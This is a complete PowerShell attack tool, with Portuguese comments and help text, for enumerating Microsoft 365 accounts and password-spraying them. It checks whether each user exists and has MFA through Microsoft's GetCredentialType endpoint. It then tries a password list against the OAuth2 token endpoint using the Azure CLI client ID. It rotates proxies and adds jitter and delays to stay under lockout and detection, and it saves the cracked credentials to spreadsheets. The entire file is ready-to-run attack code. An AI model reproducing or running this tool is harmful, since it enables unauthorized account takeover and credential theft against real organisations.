param(
    [string]$Domain   = "empresa.com",
    [string]$UserList = ".\users.txt",
    [switch]$TestLogin,
    [Alias("nq")]
    [switch]$NoQuestion,
    [Alias("nv")]
    [switch]$NoValidation,
    [string]$Proxy,
    [string[]]$ProxyList,
    [switch]$ProxyUseDefaultCredentials,
    [Alias("pu")]
    [string]$ProxyUser,
    [Alias("pp")]
    [string]$ProxyPassword,
    [Alias("s")]
    [int]$SleepMs = 500,
    [Alias("j")]
    [int]$Jitter = 0,
    [Alias("sd")]
    [int]$SprayDelay = 0,
    [string]$PassList = "senhas.txt",
    [Alias("h")]
    [switch]$Help
    )

function Show-Usage {
    Write-Host ""
    Write-Host "USO" -ForegroundColor Cyan
    Write-Host "  .\enum_passs_spray.ps1 -Domain <dominio> -UserList <arquivo> [opcoes]"
    Write-Host ""
    Write-Host "PARAMETROS" -ForegroundColor Cyan
    Write-Host "  -Domain <dominio>                  Dominio alvo. Ex: empresa.onmicrosoft.com"
    Write-Host "  -UserList <arquivo>                Arquivo com usuarios, um por linha"
    Write-Host "  -PassList <arquivo>                Arquivo com senhas, uma por linha. Padrao: senhas.txt"
    Write-Host "  -TestLogin                         Testa login (spray) para usuarios validos"
    Write-Host "  -NoQuestion, -nq                   Nao pergunta antes de testar login"
    Write-Host "  -NoValidation, -nv                 Pula a Fase 1 (enumeracao) e faz spray em TODOS os usuarios da wordlist"
    Write-Host "  -Proxy <url>                       Usa um proxy unico"
    Write-Host "  -ProxyList <url1>,<url2>           Usa um ou mais proxies com rotacao"
    Write-Host "  -ProxyUseDefaultCredentials        Usa credenciais Windows no proxy"
    Write-Host "  -ProxyUser <user>, -pu <user>      Usuario para proxy autenticado (basic/digest)"
    Write-Host "  -ProxyPassword <senha>, -pp <senha> Senha do proxy autenticado (se omitida, sera solicitada de forma segura)"
    Write-Host "  -SleepMs <ms>, -s <ms>             Tempo de espera (timeout) em milissegundos entre cada requisicao. Padrao: 500"
    Write-Host "  -Jitter <pct>, -j <pct>            Variacao aleatoria (%) aplicada ao SleepMs. Ex: 20 = +/- 20%. Padrao: 0"
    Write-Host "  -SprayDelay <min>, -sd <min>       Pausa (minutos) entre cada rodada de senha (respeita janela de lockout). Padrao: 0"
    Write-Host "  -Help, -h                          Mostra esta ajuda"
    Write-Host ""
    Write-Host "MODO DE OPERACAO" -ForegroundColor Cyan
    Write-Host "  PASSWORD SPRAYING: testa 1 senha em TODOS os usuarios validos, aguarda o"
    Write-Host "  SprayDelay e so entao passa para a proxima senha. Reduz risco de lockout."
    Write-Host ""
    Write-Host "  Com -NoValidation a Fase 1 e ignorada: todos os usuarios da wordlist sao"
    Write-Host "  tratados como alvos e vao direto para o spray (sem checar existencia/MFA)."
    Write-Host ""
    Write-Host "EXEMPLOS" -ForegroundColor Cyan
    Write-Host "  .\enum_passs_spray.ps1 -Domain empresa.onmicrosoft.com -UserList .\users.txt"
    Write-Host "  .\enum_passs_spray.ps1 -Domain empresa.onmicrosoft.com -UserList .\users.txt -TestLogin -nq"
    Write-Host "  .\enum_passs_spray.ps1 -Domain empresa.onmicrosoft.com -UserList .\users.txt -TestLogin -nq -SprayDelay 30"
    Write-Host "  .\enum_passs_spray.ps1 -Domain empresa.onmicrosoft.com -UserList .\users.txt -TestLogin -nq -nv"
    Write-Host "  .\enum_passs_spray.ps1 -Domain empresa.onmicrosoft.com -UserList .\users.txt -TestLogin -nq -s 1500 -j 20 -sd 35"
    Write-Host "  .\enum_passs_spray.ps1 -Domain empresa.onmicrosoft.com -UserList .\users.txt -TestLogin -Proxy `"http://127.0.0.1:8080`""
    Write-Host ""
}

if ($Help) {
    Show-Usage
    exit
}

# Garante que o valor do sleep nao seja negativo
if ($SleepMs -lt 0) { $SleepMs = 0 }
# Garante que o jitter (percentual) fique entre 0 e 100
if ($Jitter -lt 0)   { $Jitter = 0 }
if ($Jitter -gt 100) { $Jitter = 100 }
# Garante que o spray delay nao seja negativo
if ($SprayDelay -lt 0) { $SprayDelay = 0 }

# =========================
# Monta a credencial do proxy autenticado (se aplicavel)
# =========================
$global:ProxyCred = $null
if (-not [string]::IsNullOrWhiteSpace($ProxyUser)) {
    if ([string]::IsNullOrWhiteSpace($ProxyPassword)) {
        # Se a senha nao foi passada, solicita de forma segura (sem eco na tela)
        $securePass = Read-Host "[?] Senha do proxy para o usuario '$ProxyUser'" -AsSecureString
    }
    else {
        $securePass = ConvertTo-SecureString $ProxyPassword -AsPlainText -Force
    }
    $global:ProxyCred = New-Object System.Management.Automation.PSCredential($ProxyUser, $securePass)
}

# =========================
# Calcula o tempo de sleep aplicando o jitter (variacao aleatoria +/- pct)
# =========================
function Get-SleepWithJitter {
    param(
        [int]$BaseMs,
        [int]$JitterPct
    )
    if ($BaseMs -le 0) { return 0 }
    if ($JitterPct -le 0) { return $BaseMs }
    $delta = [int]([math]::Round($BaseMs * ($JitterPct / 100.0)))
    $min = $BaseMs - $delta
    if ($min -lt 0) { $min = 0 }
    $max = $BaseMs + $delta
    # Get-Random -Maximum e exclusivo, por isso soma +1 para incluir o limite superior
    return (Get-Random -Minimum $min -Maximum ($max + 1))
}

function Start-RequestSleep {
    $sleepAtual = Get-SleepWithJitter -BaseMs $SleepMs -JitterPct $Jitter
    if ($sleepAtual -gt 0) {
        Start-Sleep -Milliseconds $sleepAtual
    }
}

Write-Host "===============================================================================" -ForegroundColor DarkGray
Write-Host "    _____ _   _ _   _ _  __     __  __ ____" -ForegroundColor Cyan
Write-Host "   | ____| \ | | | | |  \/  |   |  \/  / ___|" -ForegroundColor Cyan
Write-Host "   |  _| |  \| | | | | |\/| |   | |\/| \___ \" -ForegroundColor Cyan
Write-Host "   | |___| |\  | |_| | |  | |   | |  | |___) |" -ForegroundColor Cyan
Write-Host "   |_____|_| \_|\___/|_|  |_|   |_|  |_|____/" -ForegroundColor Cyan
Write-Host "`n`n"
Write-Host "             ENUM MS CORPORATE - SPRAY MODE" -ForegroundColor Yellow
Write-Host "------------------------------------------------------------------------------" -ForegroundColor DarkGray
Write-Host " ferramenta para enumeracao e password spraying de contas corporativas MS" -ForegroundColor Gray
Write-Host "==============================================================================`n`n" -ForegroundColor DarkGray

# =========================
# CONFIG
# =========================
$ClientId = "04b07795-8ddb-461a-bbee-02f9e1bf7b46" # Azure CLI

# Verificar e instalar modulo do MSAL.PS se necessario
if (!(Get-Module -ListAvailable -Name MSAL.PS)) {
    Write-Host "[+] Instalando modulo MSAL.PS..." -ForegroundColor Cyan
    Install-Module -Name MSAL.PS -Force -Scope CurrentUser -AllowClobber
}
Import-Module MSAL.PS -ErrorAction Stop

if (!(Get-Module -ListAvailable -Name ImportExcel)) {
    Write-Host "[+] Instalando modulo ImportExcel..." -ForegroundColor Cyan
    Install-Module -Name ImportExcel -Force -Scope CurrentUser -AllowClobber
}
Import-Module ImportExcel -ErrorAction Stop

if (!(Test-Path $UserList)) {
    Write-Host "[ERRO] Wordlist nao encontrada: $UserList" -ForegroundColor Red
    exit
}

$timestamp  = Get-Date -Format "yyyyMMdd_HHmmss"
$outputFile = "enum_ms_$timestamp.xlsx"
$url = "https://login.microsoftonline.com/common/GetCredentialType"

$valid   = 0
$invalid = 0
$unknown = 0

$loginStatusColors = @{
    "SENHA_INCORRETA"            = "Yellow"
    "LOGIN_OK MAS MFA REQUERIDO" = "DarkYellow"
    "LOGIN_OK"                   = "Green"
    "CONTA_BLOQUEADA"            = "Red"
    "CONTA_EM_OUTRO_TENANT"      = "Yellow"
    "USUARIO_NAO_ENCONTRADO"     = "DarkGray"
    "ERRO"                       = "DarkGray"
}

$resultDir = "enum_resultados"
New-Item -ItemType Directory -Path $resultDir -Force | Out-Null

$fileValidos         = Join-Path $resultDir "validos.xlsx"
$fileSenhaIncorreta  = Join-Path $resultDir "senha_incorreta.xlsx"
$fileMfaRequerido    = Join-Path $resultDir "mfa_requerido.xlsx"
$fileBloqueados      = Join-Path $resultDir "bloqueados.xlsx"
$fileOutros          = Join-Path $resultDir "outros.xlsx"
$fileResumo          = Join-Path $resultDir "resumo.xlsx"

$allResults = New-Object System.Collections.Generic.List[object]
$validosResults = New-Object System.Collections.Generic.List[object]
$senhaIncorretaResults = New-Object System.Collections.Generic.List[object]
$mfaRequeridoResults = New-Object System.Collections.Generic.List[object]
$bloqueadosResults = New-Object System.Collections.Generic.List[object]
$outrosResults = New-Object System.Collections.Generic.List[object]

function no_question {
    param(
        [switch]$NoQuestion
    )
    return $NoQuestion.IsPresent
}

function Save-Result {
    param (
        [pscustomobject]$Result,
        [string]$LoginStatus
    )
    $script:allResults.Add($Result) | Out-Null
    switch ($LoginStatus) {
        "LOGIN_OK" {
            $script:validosResults.Add($Result) | Out-Null
        }
        "SENHA_INCORRETA" {
            $script:senhaIncorretaResults.Add($Result) | Out-Null
        }
        "LOGIN_OK MAS MFA REQUERIDO" {
            $script:mfaRequeridoResults.Add($Result) | Out-Null
        }
        "CONTA_BLOQUEADA" {
            $script:bloqueadosResults.Add($Result) | Out-Null
        }
        default {
            $script:outrosResults.Add($Result) | Out-Null
        }
    }
}

function Export-XlsxResult {
    param (
        [Parameter(Mandatory = $true)]
        [string]$Path,
        [object[]]$Data,
        [string]$WorksheetName = "Resultados"
    )
    if (Test-Path $Path) {
        Remove-Item -Path $Path -Force
    }
    if ($Data.Count -eq 0) {
        $Data = @([pscustomobject]@{
            Mensagem = "Sem resultados"
        })
    }
    $Data | Export-Excel -Path $Path -WorksheetName $WorksheetName -AutoSize -BoldTopRow -FreezeTopRow
}

function Get-ActiveProxyList {
    $proxies = New-Object System.Collections.Generic.List[string]
    if (-not [string]::IsNullOrWhiteSpace($Proxy)) {
        $proxies.Add($Proxy) | Out-Null
    }
    if ($ProxyList) {
        foreach ($proxyItem in $ProxyList) {
            if (-not [string]::IsNullOrWhiteSpace($proxyItem)) {
                $proxies.Add($proxyItem) | Out-Null
            }
        }
    }
    return $proxies.ToArray()
}

function Set-RequestProxy {
    param(
        [string[]]$Proxies
    )
    if ($Proxies -and $Proxies.Count -gt 0) {
        $proxyAtual = Get-Random -InputObject $Proxies
        $global:PSDefaultParameterValues["Invoke-RestMethod:Proxy"] = $proxyAtual
        $global:PSDefaultParameterValues["Invoke-WebRequest:Proxy"] = $proxyAtual

        # ---- Autenticacao do proxy ----
        # 1) Credenciais explicitas (usuario/senha) tem prioridade
        if ($global:ProxyCred) {
            $global:PSDefaultParameterValues["Invoke-RestMethod:ProxyCredential"] = $global:ProxyCred
            $global:PSDefaultParameterValues["Invoke-WebRequest:ProxyCredential"] = $global:ProxyCred
            # Garante que nao conflite com DefaultCredentials
            $global:PSDefaultParameterValues.Remove("Invoke-RestMethod:ProxyUseDefaultCredentials") | Out-Null
            $global:PSDefaultParameterValues.Remove("Invoke-WebRequest:ProxyUseDefaultCredentials") | Out-Null
        }
        # 2) Credenciais do Windows logado (NTLM/Kerberos)
        elseif ($ProxyUseDefaultCredentials) {
            $global:PSDefaultParameterValues["Invoke-RestMethod:ProxyUseDefaultCredentials"] = $true
            $global:PSDefaultParameterValues["Invoke-WebRequest:ProxyUseDefaultCredentials"] = $true
            $global:PSDefaultParameterValues.Remove("Invoke-RestMethod:ProxyCredential") | Out-Null
            $global:PSDefaultParameterValues.Remove("Invoke-WebRequest:ProxyCredential") | Out-Null
        }
        # 3) Sem autenticacao
        else {
            $global:PSDefaultParameterValues.Remove("Invoke-RestMethod:ProxyUseDefaultCredentials") | Out-Null
            $global:PSDefaultParameterValues.Remove("Invoke-WebRequest:ProxyUseDefaultCredentials") | Out-Null
            $global:PSDefaultParameterValues.Remove("Invoke-RestMethod:ProxyCredential") | Out-Null
            $global:PSDefaultParameterValues.Remove("Invoke-WebRequest:ProxyCredential") | Out-Null
        }

        Write-Host "[*] Usando proxy: $proxyAtual" -ForegroundColor DarkGray
        return $proxyAtual
    }
    $global:PSDefaultParameterValues.Remove("Invoke-RestMethod:Proxy") | Out-Null
    $global:PSDefaultParameterValues.Remove("Invoke-WebRequest:Proxy") | Out-Null
    $global:PSDefaultParameterValues.Remove("Invoke-RestMethod:ProxyUseDefaultCredentials") | Out-Null
    $global:PSDefaultParameterValues.Remove("Invoke-WebRequest:ProxyUseDefaultCredentials") | Out-Null
    $global:PSDefaultParameterValues.Remove("Invoke-RestMethod:ProxyCredential") | Out-Null
    $global:PSDefaultParameterValues.Remove("Invoke-WebRequest:ProxyCredential") | Out-Null
    return $null
}

$activeProxies = Get-ActiveProxyList
if ($activeProxies.Count -gt 0) {
    Write-Host "[+] Proxy habilitado: $($activeProxies.Count) configurado(s)" -ForegroundColor Cyan
    if ($global:ProxyCred) {
        Write-Host "[+] Autenticacao do proxy: usuario/senha explicitos ('$ProxyUser')" -ForegroundColor Cyan
    }
    elseif ($ProxyUseDefaultCredentials) {
        Write-Host "[+] Autenticacao do proxy: credenciais do Windows logado (NTLM/Kerberos)" -ForegroundColor Cyan
    }
    else {
        Write-Host "[+] Autenticacao do proxy: nenhuma (proxy aberto)" -ForegroundColor DarkGray
    }
}
else {
    Write-Host "[+] Nenhum proxy configurado (conexao direta)" -ForegroundColor DarkGray
}

if ($Jitter -gt 0) {
    Write-Host "[+] Timeout (sleep) entre requisicoes: $SleepMs ms (+/- $Jitter% de jitter)" -ForegroundColor Cyan
}
else {
    Write-Host "[+] Timeout (sleep) entre requisicoes: $SleepMs ms" -ForegroundColor Cyan
}

# Lista de usuarios validos que serao alvo do spray na Fase 2
$usuariosValidos = New-Object System.Collections.Generic.List[object]

if ($NoValidation) {
    # =========================================================================
    # MODO -NoValidation: pula a Fase 1 e usa TODOS os usuarios da wordlist
    # =========================================================================
    Write-Host "`n[!] Modo -NoValidation ativo: Fase 1 (enumeracao) IGNORADA." -ForegroundColor Yellow
    Write-Host "[+] Todos os usuarios da wordlist serao tratados como alvos do spray." -ForegroundColor Cyan

    foreach ($user in Get-Content $UserList) {
        if ([string]::IsNullOrWhiteSpace($user)) { continue }
        $email = "$user@$Domain"
        $usuariosValidos.Add([pscustomobject]@{
            Email  = $email
            Status = "NAO_VALIDADO"
            MFA    = "NAO_DETECTADO"
        }) | Out-Null
    }

    Write-Host "[+] Usuarios carregados (sem validacao): $($usuariosValidos.Count)" -ForegroundColor Green
}
else {
    # =========================================================================
    # FASE 1 - ENUMERACAO DE USUARIOS (existencia + MFA)
    # =========================================================================
    Write-Host "`n[+] FASE 1: Enumeracao de usuarios..." -ForegroundColor Cyan

    foreach ($user in Get-Content $UserList) {
        if ([string]::IsNullOrWhiteSpace($user)) { continue }
        $email = "$user@$Domain"
        $body  = @{ Username = $email } | ConvertTo-Json

        $status    = "DESCONHECIDO"
        $mfaStatus = "NAO_DETECTADO"

        try {
            Set-RequestProxy -Proxies $activeProxies | Out-Null
            $response = Invoke-RestMethod -Method POST `
                                         -Uri $url `
                                         -Body $body `
                                         -ContentType "application/json"

            if ($response.IfExistsResult -eq 0) {
                $status = "VALIDO"
                $valid++
            }
            elseif ($response.IfExistsResult -eq 1) {
                $status = "INVALIDO"
                $invalid++
            }
            else {
                $unknown++
            }

            # =========================
            # MFA (DETECCAO)
            # =========================
            if ($response.PSObject.Properties.Name -contains "IsMfaRegistered" -and $response.IsMfaRegistered) {
                $mfaStatus = "MFA_REGISTRADO"
            }
            elseif ($response.PSObject.Properties.Name -contains "EstsProperties" -and $response.EstsProperties.MfaRequired) {
                $mfaStatus = "MFA_REQUERIDO"
            }

            if ($response.PSObject.Properties.Name -contains "Credentials") {
                foreach ($cred in $response.Credentials) {
                    if ($cred.Type -in @("PhoneApp","OneWaySms","TwoWaySms")) {
                        $mfaStatus = "MFA_DETECTADO"
                        break
                    }
                }
            }

            if ($response.PSObject.Properties.Name -contains "ThrottleStatus" -and $response.ThrottleStatus -eq 1) {
                $mfaStatus = "MFA_POSSIVEL"
            }

            # Output da enumeracao
            Write-Host "$email -> " -ForegroundColor DarkGray -NoNewline
            $statusColor = if ($status -eq "VALIDO") { "Yellow" } else { "DarkGray" }
            Write-Host "$status | " -ForegroundColor $statusColor -NoNewline
            $mfaColor = switch ($mfaStatus) {
                "MFA_REQUERIDO"  { "Blue" }
                "MFA_DETECTADO" { "Yellow" }
                default         { "DarkGray" }
            }
            Write-Host "MFA: $mfaStatus" -ForegroundColor $mfaColor

            if ($status -eq "VALIDO") {
                $usuariosValidos.Add([pscustomobject]@{
                    Email  = $email
                    Status = $status
                    MFA    = $mfaStatus
                }) | Out-Null
            }
            else {
                # Registra usuarios nao validos ja no resultado final
                Save-Result -Result ([pscustomobject]@{
                    DataHora    = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                    Email       = $email
                    Status      = $status
                    MFA         = $mfaStatus
                    LoginStatus = "NAO_TESTADO"
                    Senha       = ""
                }) -LoginStatus "NAO_TESTADO"
            }
        }
        catch {
            Write-Host "$email -> ERRO" -ForegroundColor Red
            Save-Result -Result ([pscustomobject]@{
                DataHora    = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                Email       = $email
                Status      = "ERRO"
                MFA         = "NAO_DETECTADO"
                LoginStatus = "ERRO"
                Senha       = ""
            }) -LoginStatus "ERRO"
        }

        # Timeout (com jitter) entre cada requisicao de enumeracao
        Start-RequestSleep
    }

    Write-Host "`n[+] Enumeracao concluida. Usuarios validos: $($usuariosValidos.Count)" -ForegroundColor Green
}

# =========================================================================
# FASE 2 - PASSWORD SPRAYING (senha por fora, usuario por dentro)
# =========================================================================
$doSpray = $false

if ($TestLogin -and $usuariosValidos.Count -gt 0) {
    if (no_question -NoQuestion $NoQuestion) {
        $doSpray = $true
    }
    else {
        Write-Host "`n----------------------------------------`n"
        Write-Host "[?] Iniciar password spraying em $($usuariosValidos.Count) usuario(s)?" -ForegroundColor Yellow
        $choice = Read-Host "[y/N]"
        if ($choice -eq "y") { $doSpray = $true }
    }
}

if ($doSpray) {
    if (!(Test-Path $PassList)) {
        Write-Host "[ERRO] Arquivo de senhas nao encontrado: $PassList" -ForegroundColor Red
    }
    else {
        $listaSenhas = @(Get-Content $PassList | Where-Object { -not [string]::IsNullOrWhiteSpace($_) })

        Write-Host "`n[+] FASE 2: Password spraying" -ForegroundColor Cyan
        Write-Host "[+] Senhas a testar: $($listaSenhas.Count) | Usuarios alvo: $($usuariosValidos.Count)" -ForegroundColor Cyan
        if ($SprayDelay -gt 0) {
            Write-Host "[+] Pausa entre rodadas de senha: $SprayDelay minuto(s)" -ForegroundColor Cyan
        }

        # Resolve o TenantID / token endpoint uma unica vez
        $tokenUrl = $null
        try {
            Set-RequestProxy -Proxies $activeProxies | Out-Null
            $tenantResponse = Invoke-RestMethod `
                -Uri "https://login.microsoftonline.com/$Domain/.well-known/openid-configuration" `
                -ErrorAction Stop
            $tenantId = $tenantResponse.token_endpoint.Split('/')[3]
            $tokenUrl = "https://login.microsoftonline.com/$tenantId/oauth2/v2.0/token"
        } catch {
            Write-Host "[ERRO] Falha ao resolver o token endpoint do dominio $Domain" -ForegroundColor Red
            Write-Host "[Exception.Message]" -ForegroundColor Yellow
            Write-Host $_.Exception.Message -ForegroundColor Yellow
            if ($_.ErrorDetails -and $_.ErrorDetails.Message ) {
                Write-Host "[ErrorDetails.Message]" -ForegroundColor Cyan
                Write-Host $_.ErrorDetails.Message -ForegroundColor Cyan
            }
            Write-Host "[Proxy atual]" -ForegroundColor DarkGray
            Write-Host $global:PSDefaultParameterValues["Invoke-RestMethod:Proxy"] -ForegroundColor DarkGray
            Save-Result -Result ([pscustomobject]@{
                DataHora    = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                Email       = "-"
                Status      = "ERRO"
                MFA         = "NAO_DETECTADO"
                LoginStatus = "ERRO"
                Senha       = ""
            }) -LoginStatus "ERRO"
        }

        if ($tokenUrl) {
            # Guarda os emails que ja tiveram sucesso para nao testa-los de novo
            $usuariosComprometidos = New-Object System.Collections.Generic.HashSet[string]
            $totalSenhas = $listaSenhas.Count
            $idxSenha = 0

            foreach ($plainPass in $listaSenhas) {
                $idxSenha++
                Write-Host "`n=========================================" -ForegroundColor DarkGray
                Write-Host "[SPRAY $idxSenha/$totalSenhas] Testando senha: $plainPass" -ForegroundColor Cyan
                Write-Host "=========================================" -ForegroundColor DarkGray

                foreach ($alvo in $usuariosValidos) {
                    $email     = $alvo.Email
                    $status    = $alvo.Status
                    $mfaStatus = $alvo.MFA

                    # Pula usuarios ja comprometidos
                    if ($usuariosComprometidos.Contains($email)) { continue }

                    $loginStatus = "NAO_TESTADO"
                    try {
                        Set-RequestProxy -Proxies $activeProxies | Out-Null

                        $body = @{
                            client_id  = $ClientId
                            scope      = "https://graph.microsoft.com/.default"
                            username   = $email
                            password   = $plainPass
                            grant_type = "password"
                        }

                        $tokenResponse = Invoke-RestMethod -Method POST -Uri $tokenUrl -Body $body -ErrorAction Stop

                        if ($tokenResponse.access_token) {
                            $loginStatus = "LOGIN_OK"
                            $usuariosComprometidos.Add($email) | Out-Null
                            Write-Host "[OK] Sucesso: $email : $plainPass" -ForegroundColor Green
                        }
                    }
                    catch {
                        $errorResponse = $_.ErrorDetails.Message
                        if (-not $errorResponse) { $errorResponse = $_.Exception.Message }

                        try {
                            $errorJson = $errorResponse | ConvertFrom-Json
                            $errorDesc = $errorJson.error_description

                            switch -Regex ($errorDesc) {
                                "AADSTS50126" {
                                    $loginStatus = "SENHA_INCORRETA"
                                }
                                "AADSTS50076|AADSTS50079" {
                                    $loginStatus = "LOGIN_OK MAS MFA REQUERIDO"
                                    if ($mfaStatus -eq "NAO_DETECTADO") { $mfaStatus = "MFA_REQUERIDO" }
                                    # Senha correta (barrada no MFA) => nao testa mais esse user
                                    $usuariosComprometidos.Add($email) | Out-Null
                                }
                                "AADSTS50053" {
                                    $loginStatus = "CONTA_BLOQUEADA"
                                    # Conta bloqueada => remove do spray para nao piorar
                                    $usuariosComprometidos.Add($email) | Out-Null
                                }
                                "AADSTS50034" {
                                    $loginStatus = "USUARIO_NAO_ENCONTRADO"
                                    $usuariosComprometidos.Add($email) | Out-Null
                                }
                                default { $loginStatus = "ERRO" }
                            }
                        }
                        catch {
                            $loginStatus = "ERRO"
                        }
                    }

                    # Log da tentativa
                    $loginColor = $loginStatusColors[$loginStatus]
                    if (-not $loginColor) { $loginColor = "DarkGray" }
                    Write-Host "  $email -> $loginStatus" -ForegroundColor $loginColor

                    Save-Result -Result ([pscustomobject]@{
                        DataHora    = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                        Email       = $email
                        Status      = $status
                        MFA         = $mfaStatus
                        LoginStatus = $loginStatus
                        Senha       = $plainPass
                    }) -LoginStatus $loginStatus

                    # Timeout (com jitter) entre cada requisicao de login
                    Start-RequestSleep
                } # Fim do foreach usuarios

                # Pausa longa entre rodadas de senha (respeita janela de lockout)
                # Nao aguarda apos a ultima senha
                if ($SprayDelay -gt 0 -and $idxSenha -lt $totalSenhas) {
                    Write-Host "`n[*] Aguardando $SprayDelay minuto(s) antes da proxima senha (janela de lockout)..." -ForegroundColor Gray
                    Start-Sleep -Seconds ($SprayDelay * 60)
                }
            } # Fim do foreach senhas
        }
    }
}
elseif ($TestLogin -and $usuariosValidos.Count -eq 0) {
    Write-Host "`n[!] Nenhum usuario alvo encontrado. Spray nao sera executado." -ForegroundColor Yellow
}

# =========================
# RESUMO
# =========================
$summary = @"
=========================
RESUMO
=========================
VALIDOS:       $valid
INVALIDOS:     $invalid
DESCONHECIDOS: $unknown
=========================
"@
Write-Host "`n$summary" -ForegroundColor Cyan

$summaryData = @(
    [pscustomobject]@{ Metrica = "VALIDOS"; Valor = $valid },
    [pscustomobject]@{ Metrica = "INVALIDOS"; Valor = $invalid },
    [pscustomobject]@{ Metrica = "DESCONHECIDOS"; Valor = $unknown }
)

if (Test-Path $outputFile) {
    Remove-Item -Path $outputFile -Force
}

$masterResults = $allResults.ToArray()
if ($masterResults.Count -eq 0) {
    $masterResults = @([pscustomobject]@{
        Mensagem = "Sem resultados"
    })
}

$masterResults | Export-Excel -Path $outputFile -WorksheetName "Resultados" -AutoSize -BoldTopRow -FreezeTopRow
$summaryData | Export-Excel -Path $outputFile -WorksheetName "Resumo" -Append -AutoSize -BoldTopRow -FreezeTopRow

Export-XlsxResult -Path $fileValidos -Data $validosResults.ToArray()
Export-XlsxResult -Path $fileSenhaIncorreta -Data $senhaIncorretaResults.ToArray()
Export-XlsxResult -Path $fileMfaRequerido -Data $mfaRequeridoResults.ToArray()
Export-XlsxResult -Path $fileBloqueados -Data $bloqueadosResults.ToArray()
Export-XlsxResult -Path $fileOutros -Data $outrosResults.ToArray()
Export-XlsxResult -Path $fileResumo -Data $summaryData -WorksheetName "Resumo"

Write-Host "[+] Arquivo geral XLSX: $outputFile" -ForegroundColor Green
Write-Host "[+] Resultados XLSX em: $resultDir" -ForegroundColor Green
